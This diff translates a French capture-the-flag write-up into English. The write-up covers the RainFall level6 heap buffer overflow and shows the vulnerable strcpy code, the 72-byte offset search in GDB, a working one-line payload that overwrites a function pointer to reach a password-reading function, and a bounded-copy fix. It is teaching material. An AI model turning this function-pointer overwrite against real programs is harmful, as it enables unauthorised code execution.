@@ -1,24 +1,24 @@
 # Heap Buffer Overflow → Function Pointer Overwrite (Level6)
 
-## Objectif
+## Objective
 
-Exploiter un **heap buffer overflow** pour écraser un **pointeur de fonction** et rediriger l’exécution vers une fonction utile du binaire (`n()`).
+Exploit a **heap buffer overflow** to overwrite a **function pointer** and redirect execution to a useful function in the binary (`n()`).
 
-## Concept global
+## Overall concept
 
-Contrairement au level5 (GOT overwrite), ici on attaque :
+Unlike level5 (GOT overwrite), here we attack:
 
-- **le heap** (mémoire dynamique)
-- **un pointeur de fonction**
+- **the heap** (dynamic memory)
+- **a function pointer**
 
-Pas de modification de la GOT : la cible est un pointeur stocké sur le heap, à côté d’un buffer vulnérable.
+No GOT modification: the target is a pointer stored on the heap, next to a vulnerable buffer.
 
 ---
 
-## Organisation mémoire
+## Memory layout
 
 ```
-Adresse haute
+High address
 ┌───────────────┐
 │ Stack         │
 ├───────────────┤
@@ -30,71 +30,71 @@ Adresse haute
 ├───────────────┤
 │ Code (.text)  │
 └───────────────┘
-Adresse basse
+Low address
 ```
 
 ---
 
-## Code reconstruit
+## Reconstructed code
 
 ```c
-buf = malloc(0x40);    // 64 bytes (0x40 = 64 en décimal)
-fn_ptr = malloc(4);    // pointeur de fonction
+buf = malloc(0x40);    // 64 bytes (0x40 = 64 in decimal)
+fn_ptr = malloc(4);    // function pointer
 
 *fn_ptr = m;
 
-strcpy(buf, argv[1]); // ⚠️ vulnérable
+strcpy(buf, argv[1]); // ⚠️ vulnerable
 
 ((void (*)(void))*fn_ptr)();
 ```
 
 ---
 
-## Vulnérabilité
+## Vulnerability
 
 ```c
 strcpy(buf, argv[1]);
 ```
 
-- Copie **sans limite**.
-- Buffer = **64 octets**.
-- Si input > 64 → overflow vers le bloc suivant (le pointeur de fonction).
+- Copy with **no limit**.
+- Buffer = **64 bytes**.
+- If input > 64 → overflow into the next block (the function pointer).
 
 ---
 
-## Organisation du heap
+## Heap organisation
 
-Le heap est une zone mémoire **linéaire** (comme un tableau d’octets), organisée en **chunks** (blocs avec métadonnées) :
+The heap is a **linear** memory region (like a byte array), organised in **chunks** (blocks with metadata):
 
 ```
 [ metadata ][ buf (64 bytes) ][ metadata ][ fn_ptr (4 bytes) ]
 ```
 
-En dépassant le buffer, on écrase la zone suivante puis **le pointeur de fonction**.
+By exceeding the buffer we overwrite the next region then **the function pointer**.
 
-## Principe de l’attaque
+## Attack principle
 
 ```
-Avant :
-[ buffer ][ fn_ptr ]   →  (*fn_ptr)() appelle m()
+Before:
+[ buffer ][ fn_ptr ]   →  (*fn_ptr)() calls m()
 
-Après overflow :
-[ buffer écrasé ][ fn_ptr écrasé ]   →  (*fn_ptr)() appelle n()
+After overflow:
+[ overwritten buffer ][ overwritten fn_ptr ]   →  (*fn_ptr)() calls n()
 ```
 
-On remplace la **valeur** de `fn_ptr` (adresse de m) par l’adresse de **n**.
+We replace the **value** of `fn_ptr` (address of m) with the address of **n**.
 
 ---
 
-## Objectif de l’exploit
+## Exploit goal
 
-Remplacer :
+Replace:
 
 ```c
 *fp = m;
 ```
 
-par :
+with:
 
 ```c
 *fp = n;
@@ -102,7 +102,7 @@ par :
 
 ---
 
-## Flux d’exécution normal
+## Normal execution flow
 
 ```
 main
@@ -116,7 +116,7 @@ m()
 
 ---
 
-## Flux d’exécution après exploit
+## Execution flow after exploit
 
 ```
 main
@@ -130,45 +130,45 @@ system("/bin/cat /home/user/level7/.pass")
 
 ---
 
-## Type d’attaque
+## Attack type
 
-| Type                        | Description                        |
-| --------------------------- | ---------------------------------- |
-| Heap overflow               | Dépassement de buffer malloc       |
-| Function pointer overwrite  | Contrôle du flux d’exécution       |
-| Code reuse                  | On utilise une fonction existante |
+| Type                       | Description                    |
+| -------------------------- | ------------------------------ |
+| Heap overflow              | malloc buffer overflow         |
+| Function pointer overwrite | Control of execution flow      |
+| Code reuse                 | We use an existing function    |
 
 ---
 
-## Calcul de l’offset
+## Offset calculation
 
-- Taille du buffer : **64 octets** (`0x40` en hex = 64 en décimal).
-- L’offset jusqu’au pointeur dépend du layout heap (métadonnées, alignement).
+- Buffer size: **64 bytes** (`0x40` in hex = 64 in decimal).
+- Offset to the pointer depends on heap layout (metadata, alignment).
 
-Test en GDB :
+Test in GDB:
 
 ```bash
-"A"*71 + "BBBB"  →  registre ≠ 0x42424242  (overflow incomplet)
-"A"*72 + "BBBB"  →  registre = 0x42424242  (offset correct)
+"A"*71 + "BBBB"  →  register ≠ 0x42424242  (incomplete overflow)
+"A"*72 + "BBBB"  →  register = 0x42424242  (correct offset)
 ```
 
-**Offset = 72 octets** sur RainFall.
+**Offset = 72 bytes** on RainFall.
 
 ---
 
-## Endianness et notation `\x`
+## Endianness and `\x` notation
 
-- Adresse de **n** : `0x08048454`.
-- En **little-endian** (octet de poids faible en premier) : `\x54\x84\x04\x08`.
+- Address of **n**: `0x08048454`.
+- In **little-endian** (low byte first): `\x54\x84\x04\x08`.
 
-**Signification de `\x`** : en Python (ou C), `\x54` désigne **un octet** de valeur 0x54. Cela permet d’écrire des **octets bruts** dans le payload (adresses, shellcode, etc.), pas seulement des caractères imprimables.
+**Meaning of `\x`**: in Python (or C), `\x54` is **one byte** of value 0x54. This allows writing **raw bytes** in the payload (addresses, shellcode, etc.), not just printable characters.
 
 ---
 
 ## Payload
 
 ```
-[padding 72 octets] + [adresse de n en LE]
+[padding 72 bytes] + [address of n in LE]
 ```
 
 ```bash
@@ -177,7 +177,7 @@ Test en GDB :
 
 ---
 
-## Exploit final
+## Final exploit
 
 ```bash
 ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
@@ -185,26 +185,26 @@ Test en GDB :
 
 ---
 
-## Pourquoi ça marche ?
+## Why it works
 
-1. `strcpy` copie trop de données.
-2. Overflow du buffer heap.
-3. Écrasement du pointeur de fonction.
-4. L’appel indirect `(*fp)()` utilise notre adresse.
-5. Exécution de `n()` au lieu de `m()`.
-
----
-
-## Comparaison avec Level5
-
-| Level | Technique       | Cible                    |
-| ----- | --------------- | ------------------------ |
-| 5     | GOT overwrite   | fonction externe (libc)  |
-| 6     | Heap overflow   | pointeur de fonction     |
+1. `strcpy` copies too much data.
+2. Heap buffer overflow.
+3. Function pointer overwrite.
+4. The indirect call `(*fp)()` uses our address.
+5. Execution of `n()` instead of `m()`.
 
 ---
 
-## À vérifier en GDB
+## Comparison with Level5
+
+| Level | Technique       | Target                    |
+| ----- | --------------- | ------------------------- |
+| 5     | GOT overwrite   | external function (libc)  |
+| 6     | Heap overflow   | function pointer         |
+
+---
+
+## To check in GDB
 
 ```gdb
 p n
@@ -214,27 +214,27 @@ run $(python -c 'print "A"*72 + "BBBB"')
 p/x $eax
 ```
 
-(Adapter l’adresse du breakpoint selon le désassemblage de main — juste avant l’instruction `call *%eax` ou équivalent.)
+(Adjust breakpoint address from main disassembly — just before the `call *%eax` instruction or equivalent.)
 
-Si l’overflow est correct : avec "BBBB", `$eax` = 0x42424242 ; avec l’adresse de **n** en LE, `$eax` = 0x08048454.
+If overflow is correct: with "BBBB", `$eax` = 0x42424242; with address of **n** in LE, `$eax` = 0x08048454.
 
 ---
 
-## Correction (fix)
+## Fix
 
-Remplacer :
+Replace:
 
 ```c
 strcpy(buf, argv[1]);
 ```
 
-par :
+with:
 
 ```c
 strncpy(buf, argv[1], 64);
 ```
 
-ou vérifier la taille avant copie :
+or check length before copy:
 
 ```c
 if (strlen(argv[1]) < 64)
@@ -243,22 +243,22 @@ if (strlen(argv[1]) < 64)
 
 ---
 
-## Résumé mental
+## Mental summary
 
-- **Heap** = mémoire linéaire en chunks (malloc).
-- **strcpy** sans limite → overflow.
-- **Overwrite** du pointeur de fonction → redirection du flux vers `n()`.
-- Pas d’injection de code → **code reuse** (réutilisation d’une fonction existante).
-
----
-
-## Phrase pour l’examen
-
-> Le programme alloue deux blocs consécutifs sur le heap. En exploitant un dépassement de tampon via strcpy, on écrase le pointeur de fonction et on redirige l’exécution vers une fonction existante du binaire.
+- **Heap** = linear memory in chunks (malloc).
+- **strcpy** with no limit → overflow.
+- **Overwrite** of function pointer → redirect flow to `n()`.
+- No code injection → **code reuse** (reuse an existing function).
 
 ---
 
-## Références
+## Exam phrase
 
-- `strcpy(3)` (non borné) : https://man7.org/linux/man-pages/man3/strcpy.3.html
-- Glibc malloc internals : https://sourceware.org/glibc/wiki/MallocInternals
+> The program allocates two consecutive blocks on the heap. By exploiting a buffer overflow via strcpy, we overwrite the function pointer and redirect execution to an existing function in the binary.
+
+---
+
+## References
+
+- `strcpy(3)` (unbounded): https://man7.org/linux/man-pages/man3/strcpy.3.html
+- Glibc malloc internals: https://sourceware.org/glibc/wiki/MallocInternals
